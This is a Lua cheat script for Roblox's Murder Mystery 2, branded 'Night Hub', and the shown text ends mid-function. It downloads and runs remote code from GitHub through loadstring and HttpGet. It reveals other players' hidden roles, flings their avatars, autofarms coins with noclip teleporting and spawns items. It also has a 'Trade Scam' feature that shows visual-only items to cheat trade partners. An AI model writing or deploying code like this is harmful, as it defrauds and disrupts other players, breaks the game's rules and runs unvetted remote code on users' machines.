local v1 = unpack or table.unpack
local v2 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua'))()

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/n9owns/Files/refs/heads/main/antiafk', true))()
    end)
end)
pcall(function()
    local vu = game:GetService('VirtualUser')

    game:GetService('Players').LocalPlayer.Idled:Connect(function()
        vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        task.wait(1)
        vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end)
end)

local ReplicatedStorage, LocalPlayer, CoreGui, t1, v30, u31, v49, u50, u51, u52, u53, u54, t7, n2, n3, n4
local n5, u60, u61, u62, u63, u64, u65, t8, u68, u69, s2, n6, s3, s4, u75, u79
local v81, u87, u90, u104, t14, u107, u108, v109, u110, n12, v114, v115, v116, v117, v118, u151
local s6, u191, v193

do
    local v82, v100, v101, v102, v103, v105, v149

    do
        local Players = game:GetService('Players')
        local t12, v89, v91, v92

        do
            local RunService = game:GetService('RunService')

            ReplicatedStorage = game:GetService('ReplicatedStorage')

            local CurrentCamera = game:GetService('Workspace').CurrentCamera

            LocalPlayer = Players.LocalPlayer
            CoreGui = game:GetService('CoreGui')

            local TweenService = game:GetService('TweenService')
            local v66, t9

            do
                local MarketplaceService = game:GetService('MarketplaceService')

                do
                    local color3 = Color3.fromHex('#FF6B1A')
                    local color3_2 = Color3.fromHex('#FF4500')
                    local color3_3 = Color3.fromHex('#9D4EDD')
                    local color3_4 = Color3.fromHex('#5A189A')
                    local color3_5 = Color3.fromHex('#8B0000')
                    local color3_6 = Color3.fromHex('#E0E0E0')
                    local color3_7 = Color3.fromHex('#FF7518')
                    local color3_8 = Color3.fromHex('#6B2E8A')
                    local color3_9 = Color3.fromHex('#0D0221')
                    local color3_10 = Color3.fromHex('#39FF14')
                    local color3_11 = Color3.fromHex('#FF0000')
                    local color3_12 = Color3.fromHex('#00FF00')
                    local color3_13 = Color3.fromHex('#FFD700')
                    local color3_14 = Color3.fromHex('#C0C0C0')
                    local color3_15 = Color3.fromHex('#1E90FF')
                    local color3_16 = Color3.fromHex('#39FF14')
                    local color3_17 = Color3.fromHex('#1E90FF')
                    local color3_18 = Color3.fromHex('#e80909')

                    t1 = {
                        Orange = color3,
                        DarkOrange = color3_2,
                        Purple = color3_3,
                        DarkPurple = color3_4,
                        Blood = color3_5,
                        Ghost = color3_6,
                        Pumpkin = color3_7,
                        Witch = color3_8,
                        Midnight = color3_9,
                        Toxic = color3_10,
                        Red = color3_11,
                        Green = color3_12,
                        Gold = color3_13,
                        Silver = color3_14,
                        Blue = color3_15,
                        Innocent = color3_16,
                        Sheriff = color3_17,
                        Murder = color3_18,
                    }
                end

                function v30(p1, p2, p3)
                    local s1 = ''
                    local v242 = #p1
                    local n1 = 0

                    while true do
                        n1 += 1

                        if not (n1 <= v242) then
                            break
                        end

                        local v244 = (n1 - 1) / math.max(v242 - 1, 1)
                        local v245 = math.floor((p2.R + (p3.R - p2.R) * v244) * 255)
                        local v246 = math.floor((p2.G + (p3.G - p2.G) * v244) * 255)
                        local v247 = math.floor((p2.B + (p3.B - p2.B) * v244) * 255)

                        s1 ..= string.format('<font color="rgb(%d, %d, %d)">%s</font>', v245, v246, v247, p1:sub(n1, n1))
                    end

                    return s1
                end

                u31 = false

                local v32 = v2
                local v33 = v30('Night Hub', t1.Red, t1.Green)
                local v34 = v30('Best Murder Mystery 2 Script ', t1.Gold, t1.Blue) .. '<br/>' .. v30('Join our discord server! Daily Giveaways', t1.Blue, t1.Purple)
                local t2 = {
                    Title = 'Exit',
                    Callback = function() end,
                    Variant = 'Tertiary',
                }
                local t3 = {
                    Title = 'Copy Discord',
                    Callback = function()
                        setclipboard('https://discord.gg/hA7daxzdR')
                        v2:Notify({
                            Title = 'Discord Copied!',
                            Content = 'Discord invite copied to clipboard!',
                            Icon = 'check-circle',
                            Duration = 3,
                        })

                        u31 = true
                    end,
                    Variant = 'Secondary',
                }
                local v37 = v30('Continue', t1.Toxic, t1.Orange)
                local Popup = v32.Popup
                local t4 = {
                    Title = v37,
                    Callback = function()
                        u31 = true
                    end,
                    Variant = 'Primary',
                }

                Popup(v32, {
                    Title = v33,
                    Icon = 'skull',
                    Content = v34,
                    Buttons = {t2, t3, t4},
                })

                repeat
                    task.wait()
                until u31

                local v41 = v2
                local v42 = v30('Night Hub | Murder Mystery 2', t1.Red, t1.Green)
                local uDim2 = UDim2.new(0, 580, 0, 480)
                local uDim = UDim.new(0.5, 0)
                local CreateWindow = v41.CreateWindow
                local colorSequence = ColorSequence.new(t1.Red, t1.Green)
                local t5 = {
                    Title = 'Open Night Hub',
                    CornerRadius = uDim,
                    StrokeThickness = 2,
                    Enabled = true,
                    Draggable = true,
                    OnlyMobile = false,
                    Color = colorSequence,
                }
                local t6 = {
                    Enabled = true,
                    Anonymous = false,
                    Callback = function() end,
                }

                v49 = CreateWindow(v41, {
                    Title = v42,
                    Author = 'by hibatzzz ',
                    Folder = 'R3W Hb',
                    Icon = 'skull',
                    NewElements = true,
                    Size = uDim2,
                    Transparent = true,
                    BackgroundTransparency = 0.5,
                    Theme = 'Dark',
                    SideBarWidth = 220,
                    HideSearchBar = false,
                    ScrollBarEnabled = true,
                    OpenButton = t5,
                    User = t6,
                })
                u50 = false
                u51 = false
                u52 = false
                u53 = false
                u54 = false
                t7 = {}
                n2 = 25
                n3 = 0
                n4 = 0
                n5 = 40
                u60 = false
                u61 = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

                u61:WaitForChild('HumanoidRootPart')

                u62 = nil
                u63 = false
                u64 = false
                u65 = nil
                u62 = 818078531

                function v66()
                    local ok, result = pcall(function()
                        return MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, u62)
                    end)

                    if ok then
                        if result then
                            n5 = 50

                            return
                        end

                        n5 = 40

                        return
                    end

                    n5 = 40
                end

                v66()

                t8 = {
                    'Esp All',
                }
                u68 = true
                u69 = false
                t9 = {}
                s2 = ''
                n6 = 1
                s3 = ''
                s4 = ''
                u75 = nil

                pcall(function()
                    local mainGui = LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('MainGUI')

                    if mainGui then
                        local gameScreen = mainGui:FindFirstChild('Game')
                        local lobbyScreen = mainGui:FindFirstChild('Lobby')

                        if gameScreen and gameScreen:FindFirstChild('Inventory') then
                            u75 = gameScreen.Inventory.Main
                        elseif lobbyScreen and lobbyScreen:FindFirstChild('Screens') and lobbyScreen.Screens:FindFirstChild('Inventory') then
                            u75 = lobbyScreen.Screens.Inventory.Main
                        end
                    end
                end)

                local t10 = {
                    Value = 16,
                    Default = 16,
                    Locked = false,
                }
                local t11 = {
                    Value = 50,
                    Default = 50,
                    Locked = false,
                }

                t12 = {
                    WalkSpeed = t10,
                    JumpPower = t11,
                }
            end

            u79 = nil
            u79 = {}

            local function v80()
                pcall(function()
                    local GetPlayerData = ReplicatedStorage:FindFirstChild('GetPlayerData', true)

                    if GetPlayerData then
                        local v492 = GetPlayerData:InvokeServer()

                        if v492 then
                            u79 = v492
                        end
                    end
                end)
            end

            function v81()
                local v257, v258, v259 = ipairs(Players:GetPlayers())
                local v260

                repeat
                    repeat
                        v259, v260 = v257(v258, v259)

                        if not v259 then
                            for k, v in pairs(u79)do
                                if v.Role ~= 'Murderer' then
                                    continue
                                end

                                local k2 = Players:FindFirstChild(k)

                                if k2 then
                                    return k2
                                end
                            end

                            return nil
                        end
                    until v260 ~= LocalPlayer

                    local Backpack = v260:FindFirstChild('Backpack')
                    local Character = v260.Character

                    if Backpack then
                        Backpack = Backpack:FindFirstChild('Knife')
                    end
                until Backpack or Character and Character:FindFirstChild('Knife')

                return v260
            end
            function v82()
                if workspace:FindFirstChild('GunDrop', true) then
                    return nil
                end

                local v266, v267, v268 = pairs(Players:GetPlayers())
                local v269

                repeat
                    repeat
                        v268, v269 = v266(v267, v268)

                        if not v268 then
                            for k, v in pairs(u79)do
                                if not (v.Role == 'Sheriff' or v.Role == 'Hero') then
                                    continue
                                end

                                local k3 = Players:FindFirstChild(k)

                                if k3 then
                                    return k3
                                end
                            end

                            return nil
                        end
                    until v269 ~= LocalPlayer and v269.Character

                    local Backpack = v269:FindFirstChild('Backpack')
                until v269.Character:FindFirstChild('Gun') or Backpack and Backpack:FindFirstChild('Gun')

                return v269
            end

            local function v83(p4, p5)
                if not p4 then
                    return false
                end
                if table.find(p5, 'Esp All') then
                    return true
                end
                if table.find(p5, 'Esp Murder') and p4 == 'Murderer' then
                    return true
                end
                if table.find(p5, 'Esp Sheriff') and p4 == 'Sheriff' then
                    return true
                end
                if table.find(p5, 'Esp Sheriff / Murder') and p4 == 'Sheriff' or p4 == 'Murderer' then
                    return true
                end

                return false
            end
            local function v84(p6, p7)
                local RoleHighlight = p6:FindFirstChild('RoleHighlight')

                if not RoleHighlight then
                    RoleHighlight = Instance.new('Highlight')
                    RoleHighlight.Name = 'RoleHighlight'
                    RoleHighlight.FillTransparency = 0.5
                    RoleHighlight.OutlineTransparency = 1
                    RoleHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                    RoleHighlight.Adornee = p6
                    RoleHighlight.Parent = p6
                end

                RoleHighlight.FillColor = p7
            end
            local function v85(p8)
                if not p8 then
                    return
                end

                local RoleHighlight = p8:FindFirstChild('RoleHighlight')

                if RoleHighlight then
                    RoleHighlight:Destroy()
                end
            end
            local function v86(p9, p10)
                if not t9[p9] then
                    local drawing = Drawing.new('Line')

                    drawing.Thickness = 2

                    if not p10 then
                        p10 = Color3.new(1, 1, 1)
                    end

                    drawing.Color = p10
                    drawing.Transparency = 1
                    t9[p9] = drawing
                end
            end

            u87 = nil

            function u87(p11)
                if t9[p11] then
                    t9[p11]:Remove()

                    t9[p11] = nil
                end
            end

            local function v88()
                pcall(function()
                    v80()

                    local v493 = v81()
                    local v494 = v82()

                    for _, player in ipairs(Players:GetPlayers())do
                        if player ~= LocalPlayer and player.Character then
                            local Humanoid = player.Character:FindFirstChild('Humanoid')
                            local Head = player.Character:FindFirstChild('Head')

                            if not Humanoid or Humanoid.Health <= 0 then
                                v85(player.Character)
                                u87(player)

                                if Head and Head:FindFirstChild('RoleESP') then
                                    Head.RoleESP:Destroy()
                                end
                            else
                                local s5 = 'Innocent'

                                if player == v493 then
                                    s5 = 'Murderer'
                                elseif player == v494 then
                                    s5 = 'Sheriff'
                                end

                                local v500 = v83(s5, t8)

                                if u68 and v500 then
                                    local v501 = if s5 ~= 'Murderer'then if s5 ~= 'Sheriff'then t1.Innocent else t1.Blue else t1.Blood

                                    v84(player.Character, v501)

                                    if Head then
                                        local RoleESP = Head:FindFirstChild('RoleESP')

                                        if not RoleESP then
                                            RoleESP = Instance.new('BillboardGui')
                                            RoleESP.Name = 'RoleESP'
                                            RoleESP.Size = UDim2.new(0, 100, 0, 40)
                                            RoleESP.StudsOffset = Vector3.new(0, 3, 0)
                                            RoleESP.AlwaysOnTop = true
                                            RoleESP.Parent = Head

                                            local TextLabel = Instance.new('TextLabel')

                                            TextLabel.Name = 'Text'
                                            TextLabel.Size = UDim2.new(1, 0, 1, 0)
                                            TextLabel.BackgroundTransparency = 1
                                            TextLabel.Font = Enum.Font.GothamBold
                                            TextLabel.TextSize = 14
                                            TextLabel.TextStrokeTransparency = 0
                                            TextLabel.Parent = RoleESP
                                        end

                                        RoleESP.Text.Text = s5
                                        RoleESP.Text.TextColor3 = v501
                                    end
                                else
                                    v85(player.Character)

                                    if Head and Head:FindFirstChild('RoleESP') then
                                        Head.RoleESP:Destroy()
                                    end
                                end
                                if u69 and v500 then
                                    local v504 = if s5 ~= 'Murderer'then if s5 ~= 'Sheriff'then t1.Innocent else t1.Blue else t1.Blood

                                    v86(player, v504)

                                    if t9[player] then
                                        t9[player].Color = v504
                                    end
                                else
                                    u87(player)
                                end
                            end
                        else
                            u87(player)
                        end
                    end
                end)
            end

            task.spawn(function()
                while task.wait(1) do
                    if u68 or u69 then
                        v88()
                    end
                end
            end)
            RunService.RenderStepped:Connect(function()
                if u69 then
                    for k, v in pairs(t9)do
                        local v280 = k
                        local Character = v280.Character

                        if Character then
                            Character = v280.Character:FindFirstChild('HumanoidRootPart') and (v280.Character:FindFirstChild('Humanoid') and v280.Character.Humanoid.Health > 0)
                        end
                        if Character then
                            local v282, v283 = CurrentCamera:WorldToViewportPoint(v280.Character.HumanoidRootPart.Position)

                            if v283 then
                                v.From = Vector2.new(CurrentCamera.ViewportSize.X / 2, CurrentCamera.ViewportSize.Y)
                                v.To = Vector2.new(v282.X, v282.Y)
                                v.Visible = true
                            else
                                v.Visible = false
                            end
                        else
                            v.Visible = false
                        end
                    end
                end
            end)

            function v89()
                local Humanoid = LocalPlayer.Character:FindFirstChildOfClass('Humanoid')

                if Humanoid then
                    if not t12.WalkSpeed.Locked then
                        Humanoid.WalkSpeed = t12.WalkSpeed.Value
                    end
                    if not t12.JumpPower.Locked then
                        Humanoid.JumpPower = t12.JumpPower.Value
                    end
                end
            end

            u90 = nil

            function u90(p12)
                local Players2 = game:GetService('Players')
                local u286 = false

                local function v287(p13)
                    local Character = Players2.LocalPlayer.Character
                    local v511 = Character and Character:FindFirstChildOfClass('Humanoid')
                    local v512 = v511 and v511.RootPart
                    local Character2 = p13.Character
                    local v514 = Character2 and Character2:FindFirstChildOfClass('Humanoid')
                    local v515 = v514 and v514.RootPart
                    local v516 = Character2 and Character2:FindFirstChild('Head')

                    if not Character or (not v511 or not v512) then
                        return
                    end
                    if v512.Velocity.Magnitude < 50 then
                        getgenv().OldPos = v512.CFrame
                    end
                    if v514 and (v514.Sit and not u286) then
                        return
                    end
                    if v516 then
                        workspace.CurrentCamera.CameraSubject = v516
                    elseif v514 and v515 then
                        workspace.CurrentCamera.CameraSubject = v514
                    end

                    local function v517(p14, p15, p16)
                        v512.CFrame = CFrame.new(p14.Position) * p15 * p16

                        Character:SetPrimaryPartCFrame(CFrame.new(p14.Position) * p15 * p16)

                        v512.Velocity = Vector3.new(900000000, 900000000, 900000000)
                        v512.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
                    end
                    local function v518(p17)
                        local n7 = 0
                        local timestamp = tick()

                        repeat
                            if not v512 or not v514 then
                                return
                            end
                            if p17.Velocity.Magnitude < 50 then
                                n7 += 100

                                v517(p17, CFrame.new(0, 1.5, 0) + v514.MoveDirection * p17.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(n7), 0, 0))
                                task.wait()
                                v517(p17, CFrame.new(0, -1.5, 0) + v514.MoveDirection * p17.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(n7), 0, 0))
                                task.wait()
                                v517(p17, CFrame.new(2.25, 1.5, -2.25) + v514.MoveDirection * p17.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(n7), 0, 0))
                                task.wait()
                                v517(p17, CFrame.new(-2.25, -1.5, 2.25) + v514.MoveDirection * p17.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(n7), 0, 0))
                                task.wait()
                            else
                                v517(p17, CFrame.new(0, 1.5, v514.WalkSpeed), CFrame.Angles(1.5707963267948966, 0, 0))
                                task.wait()
                                v517(p17, CFrame.new(0, -1.5, -v514.WalkSpeed), CFrame.Angles(0, 0, 0))
                                task.wait()
                            end
                            if p17.Velocity.Magnitude > 500 or p17.Parent ~= p13.Character or p13.Parent ~= Players2 or p13.Character ~= Character2 or v514.Sit or v511.Health <= 0 then
                                return
                            end
                        until tick() > timestamp + 2
                    end

                    workspace.FallenPartsDestroyHeight = (0 / 0)

                    local BodyVelocity = Instance.new('BodyVelocity')

                    BodyVelocity.Name = 'EpixVel'
                    BodyVelocity.Parent = v512
                    BodyVelocity.Velocity = Vector3.new(900000000, 900000000, 900000000)
                    BodyVelocity.MaxForce = Vector3.new((1/0), (1/0), (1/0))

                    v511:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

                    if v515 and v516 then
                        if (v515.CFrame.p - v516.CFrame.p).Magnitude > 5 then
                            v518(v516)
                        else
                            v518(v515)
                        end
                    elseif v515 then
                        v518(v515)
                    elseif v516 then
                        v518(v516)
                    end

                    BodyVelocity:Destroy()
                    v511:SetStateEnabled(Enum.HumanoidStateType.Seated, true)

                    workspace.CurrentCamera.CameraSubject = v511

                    if not ((v512.Position - getgenv().OldPos.p).Magnitude < 25) then
                    end

                    repeat
                        v512.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)

                        Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
                        v511:ChangeState('GettingUp')

                        for _, child in pairs(Character:GetChildren())do
                            if child:IsA('BasePart') then
                                child.Velocity = Vector3.new()
                                child.RotVelocity = Vector3.new()
                            end
                        end

                        task.wait()
                    until (v512.Position - getgenv().OldPos.p).Magnitude < 25

                    workspace.FallenPartsDestroyHeight = -500
                end

                if not p12[1] then
                    return
                end
                if u286 then
                    for _, player in pairs(Players2:GetPlayers())do
                        v287(player)
                    end
                else
                    for _, v in pairs(p12)do
                        local v292 = (function(p18)
                            local v506 = p18:lower()

                            if v506 == 'all' or v506 == 'others' then
                                u286 = true

                                return
                            end

                            for _, player in pairs(Players2:GetPlayers())do
                                if player ~= Players2.LocalPlayer and (player.Name:lower():match('^' .. v506) or player.DisplayName:lower():match('^' .. v506)) then
                                    return player
                                end
                            end
                        end)(v)

                        if v292 and v292 ~= Players2.LocalPlayer then
                            v287(v292)
                        end
                    end
                end
            end
            function v91()
                local v294 = v81()

                if v294 and v294.Character then
                    local v295 = v2
                    local v296 = 'Flinging ' .. v294.Name .. '!'

                    v295:Notify({
                        Title = 'Flinging Murderer',
                        Content = v296,
                        Icon = 'zap',
                        Duration = 3,
                    })
                    u90({
                        v294.Name,
                    })
                    v2:Notify({
                        Title = 'Fling Complete',
                        Content = 'Murderer has been flung!',
                        Icon = 'check-circle',
                        Duration = 2,
                    })

                    return true
                end

                v2:Notify({
                    Title = 'Fling Error',
                    Content = 'No murderer found!',
                    Icon = 'x-circle',
                    Duration = 3,
                })

                return false
            end
            function v92()
                local v297 = v82()

                if v297 and v297.Character then
                    local v298 = v2
                    local v299 = 'Flinging ' .. v297.Name .. '!'

                    v298:Notify({
                        Title = 'Flinging Sheriff',
                        Content = v299,
                        Icon = 'zap',
                        Duration = 3,
                    })
                    u90({
                        v297.Name,
                    })
                    v2:Notify({
                        Title = 'Fling Complete',
                        Content = 'Sheriff has been flung!',
                        Icon = 'check-circle',
                        Duration = 2,
                    })

                    return true
                end

                v2:Notify({
                    Title = 'Fling Error',
                    Content = 'No sheriff found!',
                    Icon = 'x-circle',
                    Duration = 3,
                })

                return false
            end

            local function v93()
                return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            end
            local function v94()
                return v93():WaitForChild('HumanoidRootPart')
            end
            local function v95()
                local v300 = v94()
                local v301
                local huge = math.huge

                for _, child in pairs(workspace:GetChildren())do
                    if child:FindFirstChild('CoinContainer') then
                        for _, child2 in pairs(child.CoinContainer:GetChildren())do
                            if child2:IsA('BasePart') and child2:FindFirstChild('TouchInterest') then
                                local Magnitude = (v300.Position - child2.Position).Magnitude

                                if Magnitude < huge then
                                    v301 = child2
                                    huge = Magnitude
                                end
                            end
                        end
                    end
                end

                return v301, huge
            end
            local function v96()
                local v308
                local v309 = v94()
                local n8 = (1/0)

                for v313, v314 in pairs(workspace:GetChildren())do
                    if v314:FindFirstChild('CoinContainer') then
                        for _, child in pairs(v314.CoinContainer:GetChildren())do
                            if child:IsA('BasePart') and (child:GetAttribute('CoinID') == 'Candy' and child:FindFirstChild('TouchInterest')) then
                                local Magnitude = (v309.Position - child.Position).Magnitude

                                if Magnitude < n8 then
                                    n8 = Magnitude
                                    v308 = child
                                end
                            end
                        end
                    end
                end

                if not v308 then
                    for _, descendant in ipairs(workspace:GetDescendants())do
                        if descendant:IsA('BasePart') and descendant.Name == 'candy' then
                            local Magnitude = (v309.Position - descendant.Position).Magnitude

                            if Magnitude < n8 then
                                n8 = Magnitude
                                v308 = descendant
                            end
                        end
                    end
                end

                return v308, n8
            end

            local v97 = ReplicatedStorage:FindFirstChild('Remotes') and (ReplicatedStorage.Remotes:FindFirstChild('Gameplay') and ReplicatedStorage.Remotes.Gameplay:FindFirstChild('CoinCollected'))
            local v98 = ReplicatedStorage:FindFirstChild('Remotes') and (ReplicatedStorage.Remotes:FindFirstChild('Gameplay') and ReplicatedStorage.Remotes.Gameplay:FindFirstChild('RoundStart'))
            local v99 = ReplicatedStorage:FindFirstChild('Remotes') and (ReplicatedStorage.Remotes:FindFirstChild('Gameplay') and ReplicatedStorage.Remotes.Gameplay:FindFirstChild('RoundEndFade'))

            if v98 then
                v98.OnClientEvent:Connect(function()
                    u63 = true
                    u65 = v94().CFrame
                end)
            end
            if v99 then
                v99.OnClientEvent:Connect(function()
                    u63 = false
                end)
            end

            task.spawn(function()
                while true do
                    if u50 or u51 and (u63 and true) then
                        local v321
                        local v322 = v94()
                        local n9 = (1/0)

                        if u51 then
                            v321, n9 = v96()
                        elseif u50 then
                            v321, n9 = v95()
                        end
                        if v321 then
                            if n9 > 150 then
                                v322.CFrame = v321.CFrame
                            else
                                local tween = TweenService:Create(v322, TweenInfo.new(n9 / n2, Enum.EasingStyle.Linear), {
                                    CFrame = v321.CFrame,
                                })

                                tween:Play()

                                repeat
                                    task.wait()
                                until not v321:FindFirstChild('TouchInterest') or not u63 or not u50 and not u51

                                tween:Cancel()
                            end

                            n3 += 1
                        end
                    end

                    task.wait(0.2)
                end
            end)
            RunService.Stepped:Connect(function()
                if u50 or u51 and (u63 and true) then
                    local Character = LocalPlayer.Character
                    local v326 = Character

                    if Character then
                        v326 = Character:IsDescendantOf(workspace)
                    end
                    if v326 then
                        local GetDescendants = Character.GetDescendants

                        for _, v in ipairs(GetDescendants(Character))do
                            if v:IsA('BasePart') then
                                v.CanCollide = false
                            end
                        end
                    end
                end
            end)
            RunService.Stepped:Connect(function()
                if u60 then
                    for _, player in ipairs(Players:GetPlayers())do
                        if player ~= LocalPlayer and player.Character then
                            for _, descendant in ipairs(player.Character:GetDescendants())do
                                if descendant:IsA('BasePart') then
                                    descendant.CanCollide = false
                                end
                            end
                        end
                    end
                end
            end)
            LocalPlayer.CharacterAdded:Connect(function(character)
                u61 = character

                character:WaitForChild('HumanoidRootPart')

                t7 = {}
                n4 = 0
                u64 = false

                v66()
            end)

            if v97 then
                v97.OnClientEvent:Connect(function(p19, p20, _, _)
                    if p19 == 'Candy' then
                        n4 = p20

                        if n4 >= n5 then
                            local v339 = v2
                            local v340 = 'Candy bag is full (' .. n4 .. '/' .. n5 .. ')'

                            v339:Notify({
                                Title = 'Bag Full!',
                                Content = v340,
                                Icon = 'package',
                                Duration = 3,
                            })

                            u51 = false
                            u50 = false

                            if u53 then
                                v91()
                            end
                            if u52 and not u64 then
                                local v341 = v94()

                                if u65 then
                                    local tween = TweenService:Create(v341, TweenInfo.new(2, Enum.EasingStyle.Linear), {CFrame = u65})

                                    tween:Play()
                                    tween.Completed:Wait()
                                end

                                task.wait(0.5)

                                if LocalPlayer.Character then
                                    LocalPlayer.Character:BreakJoints()
                                    LocalPlayer.CharacterAdded:Wait()
                                    task.wait(1.5)
                                end
                            end
                        end
                    end
                end)
            end
            if v98 then
                v98.OnClientEvent:Connect(function()
                    t7 = {}
                    u65 = v94().CFrame

                    if u51 then
                        v2:Notify({
                            Title = 'Round Started!',
                            Content = 'Candy autofarm resumed automatically',
                            Icon = 'play-circle',
                            Duration = 2,
                        })
                    end
                    if u50 then
                        v2:Notify({
                            Title = 'Round Started!',
                            Content = 'Coin autofarm resumed automatically',
                            Icon = 'play-circle',
                            Duration = 2,
                        })
                    end
                end)
            end

            function v100()
                wait(math.random(1, 3))

                for _, child in pairs(u75.Weapons.Items.Container:GetChildren())do
                    for _, child3 in pairs(child.Container:GetChildren())do
                        if child3.Name == 'Christmas' or child3.Name == 'Halloween' then
                            for _, child4 in pairs(child3.Container:GetChildren())do
                                if child4:IsA('Frame') and child4.ItemName.Label.Text == s2 then
                                    local AmountText = child4.Container.Amount.Text

                                    if AmountText == '' or AmountText == 'None' then
                                        child4.Container.Amount.Text = 'x2'
                                    else
                                        local num = tonumber(AmountText:match('x(%d+)'))

                                        if num then
                                            child4.Container.Amount.Text = 'x' .. tostring(num + 1)
                                        end
                                    end
                                end
                            end
                        else
                            local v355 = child3:IsA('Frame')

                            if v355 then
                                v355 = child3.ItemName.Label.Text == s2
                            end
                            if v355 then
                                local AmountText = child3.Container.Amount.Text

                                if AmountText == '' or AmountText == 'None' then
                                    child3.Container.Amount.Text = 'x2'
                                else
                                    local num = tonumber(AmountText:match('x(%d+)'))

                                    if num then
                                        child3.Container.Amount.Text = 'x' .. tostring(num + 1)
                                    end
                                end
                            end
                        end
                    end
                end
            end
            function v101()
                wait(math.random(3, 5))

                for v360, v361 in pairs(u75.Weapons.Items.Container:GetChildren())do
                    for _, child in pairs(v361.Container:GetChildren())do
                        if child.Name == 'Christmas' or child.Name == 'Halloween' then
                            for _, child5 in pairs(child.Container:GetChildren())do
                                if child5:IsA('Frame') and (child5.ItemName.Label.Text ~= 'Default Knife' and child5.ItemName.Label.Text ~= 'Default Gun') then
                                    local AmountText = child5.Container.Amount.Text

                                    if AmountText == '' or AmountText == 'None' then
                                        child5.Container.Amount.Text = 'x2'
                                    else
                                        local num = tonumber(AmountText:match('x(%d+)'))

                                        if num then
                                            child5.Container.Amount.Text = 'x' .. tostring(num * 2)
                                        end
                                    end
                                end
                            end
                        else
                            local v368 = child:IsA('Frame')

                            if v368 then
                                v368 = child.ItemName.Label.Text ~= 'Default Knife'

                                if v368 then
                                    v368 = child.ItemName.Label.Text ~= 'Default Gun'
                                end
                            end
                            if v368 then
                                local AmountText = child.Container.Amount.Text

                                if AmountText == '' or AmountText == 'None' then
                                    child.Container.Amount.Text = 'x2'
                                else
                                    local num = tonumber(AmountText:match('x(%d+)'))

                                    if num then
                                        child.Container.Amount.Text = 'x' .. tostring(num * 2)
                                    end
                                end
                            end
                        end
                    end
                end
                for _, child in pairs(u75.Pets.Items.Container.Current.Container:GetChildren())do
                    if child:IsA('Frame') then
                        local AmountText = child.Container.Amount.Text

                        if AmountText == '' or AmountText == 'None' then
                            child.Container.Amount.Text = 'x2'
                        else
                            local num = tonumber(AmountText:match('x(%d+)'))

                            if num then
                                child.Container.Amount.Text = 'x' .. tostring(num * 2)
                            end
                        end
                    end
                end
            end
            function v102(p23, p24)
                local v345 = p23:gsub('_G_%d%d%d%d', ''):gsub('_K_%d%d%d%d', '')
                local lower = p24.lower

                return v345:lower():find(lower(p24), 1, true) ~= nil
            end
            function v103()
                if game:GetService('Players').LocalPlayer.PlayerGui.TradeGUI.Enabled == true or game:GetService('Players').LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled == true then
                    wait(1)
                    v2:Notify({
                        Title = 'Trade Scam Active',
                        Content = 'Items In Trade Are Now Visual, Remove All Items!',
                        Icon = 'alert-triangle',
                        Duration = 5,
                    })

                    return
                end

                v2:Notify({
                    Title = 'Trade Scam Error',
                    Content = 'You Need To Be In Trade For This To Work!',
                    Icon = 'x-circle',
                    Duration = 5,
                })
            end

            u104 = nil

            function u104()
                local ok, result = pcall(function()
                    return require(ReplicatedStorage.Database.Sync.MysteryBox)
                end)
                local v377 = not ok

                if not v377 then
                    v377 = not result or next(result) == nil
                end
                if v377 then
                    return 'StandardBox'
                end

                local t13 = {}

                for k, _ in pairs(result)do
                    table.insert(t13, k)
                end

                return t13[math.random(1, #t13)]
            end
            function v105(p25)
                local u382 = p25

                if not pcall(function()
                    local BoxModule = require(ReplicatedStorage.Modules.BoxModule)

                    if u382 and require(ReplicatedStorage.Database.Sync.Item)[u382] then
                        BoxModule.OpenBox(u104(), u382)
                        pcall(function()
                            getsenv(LocalPlayer.PlayerGui.MainGUI.Inventory.NewItem)._G.NewItem(u382, nil, nil, 'Weapons', 1)
                        end)

                        local v523 = v2
                        local Notify = v523.Notify
                        local v525 = 'Successfully spawned: ' .. u382

                        Notify(v523, {
                            Title = 'Success',
                            Content = v525,
                            Icon = 'check-circle',
                            Duration = 3,
                        })

                        return
                    end

                    local v526 = v2
                    local v527 = 'Invalid item: ' .. u382

                    v526:Notify({
                        Title = 'Error',
                        Content = v527,
                        Icon = 'x-circle',
                        Duration = 3,
                    })
                end) then
                    local v383 = v2
                    local Notify = v383.Notify
                    local v385 = 'Error opening crate for: ' .. u382

                    Notify(v383, {
                        Title = 'Error',
                        Content = v385,
                        Icon = 'x-circle',
                        Duration = 3,
                    })
                end
            end

            t14 = {
                AutoGrabEnabled = false,
                NotifyGunDrop = true,
                GunDropCheckInterval = 1,
                ActiveGunDrops = {},
            }
            u107 = nil
            u107 = {
                'ResearchFacility',
                'Hospital3',
                'MilBase',
                'House2',
                'Workplace',
                'Mansion2',
                'BioLab',
                'Hotel',
                'Factory',
                'Bank2',
                'PoliceStation',
            }
            u108 = nil

            function u108()
                t14.ActiveGunDrops = {}

                for _, v in ipairs(u107)do
                    local v3 = workspace:FindFirstChild(v)

                    if v3 then
                        local GunDrop = v3:FindFirstChild('GunDrop')

                        if GunDrop then
                            table.insert(t14.ActiveGunDrops, GunDrop)
                        end
                    end
                end

                local GunDrop = workspace:FindFirstChild('GunDrop')

                if GunDrop then
                    table.insert(t14.ActiveGunDrops, GunDrop)
                end
            end
            function v109(p26)
                if not p26 then
                    u108()

                    if #t14.ActiveGunDrops == 0 then
                        v2:Notify({
                            Title = 'Gun System',
                            Content = 'No guns available on the map',
                            Icon = 'x-circle',
                            Duration = 3,
                        })

                        return false
                    end

                    p26 = nil

                    local n10 = (1/0)
                    local Character = LocalPlayer.Character
